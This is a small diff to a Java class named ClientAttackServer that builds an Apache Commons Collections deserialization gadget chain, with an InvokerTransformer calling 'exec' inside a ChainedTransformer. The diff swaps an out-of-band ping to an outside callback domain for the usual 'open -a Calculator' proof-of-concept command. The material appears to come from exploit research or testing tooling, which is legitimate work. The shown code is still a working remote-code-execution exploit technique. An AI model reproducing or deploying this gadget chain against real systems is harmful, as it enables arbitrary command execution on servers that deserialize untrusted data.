@@ -32,7 +32,7 @@ public class ClientAttackServer {
                 new InvokerTransformer(
                         "exec",
                         new Class[]{String.class},
-                        new Object[]{"ping 6y7d5.cxsys.spacetab.top"}
+                        new Object[]{"open -a Calculator"}
                 )
         };
         Transformer chainedTransformer = new ChainedTransformer(transformers);
